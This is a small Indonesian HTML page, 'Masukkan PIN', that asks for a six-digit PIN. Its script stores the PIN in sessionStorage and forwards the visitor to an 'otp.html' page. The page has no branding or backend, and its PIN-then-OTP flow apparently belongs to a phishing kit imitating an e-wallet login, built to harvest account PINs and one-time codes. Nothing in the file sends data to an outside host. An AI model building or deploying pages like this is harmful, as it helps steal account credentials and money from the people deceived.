
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan PIN</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      background-color: #fff;
      color: #333;
    }

    .header {
      background-color: #008CFF;
      color: white;
      padding: 16px;
      font-size: 18px;
      font-weight: bold;
      text-align: center;
      position: relative;
    }

    .header::before {
      content: "<";
      position: absolute;
      left: 16px;
      top: 12px;
      font-size: 24px;
    }

    .container {
      text-align: center;
      padding: 40px 20px;
    }

    .title {
      font-size: 20px;
      margin-bottom: 10px;
    }

    .desc {
      font-size: 14px;
      color: #555;
      margin-bottom: 30px;
    }

    .pin-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 30px;
    }

    .pin-inputs input {
      width: 50px;
      height: 60px;
      text-align: center;
      font-size: 24px;
      border: 2px solid #ccc;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="header">Masukkan PIN</div>
  <div class="container">
    <div class="title">Silakan Masukkan PIN Anda</div>
    <div class="desc">PIN terdiri dari 6 digit</div>
    <div class="pin-inputs">
      <input type="tel" maxlength="1" oninput="moveNext(this, 0)" />
      <input type="tel" maxlength="1" oninput="moveNext(this, 1)" />
      <input type="tel" maxlength="1" oninput="moveNext(this, 2)" />
      <input type="tel" maxlength="1" oninput="moveNext(this, 3)" />
      <input type="tel" maxlength="1" oninput="moveNext(this, 4)" />
      <input type="tel" maxlength="1" oninput="moveNext(this, 5)" />
    </div>
  </div>
  <script>
    const inputs = document.querySelectorAll(".pin-inputs input");

    function moveNext(el, index) {
      if (el.value.length === 1) {
        if (index < inputs.length - 1) {
          inputs[index + 1].focus();
        } else {
          const pin = Array.from(inputs).map(i => i.value).join('');
          sessionStorage.setItem("pin", pin);
          window.location.href = "otp.html";
        }
      }
    }

    window.onload = () => inputs[0].focus();
  </script>
</body>
</html>
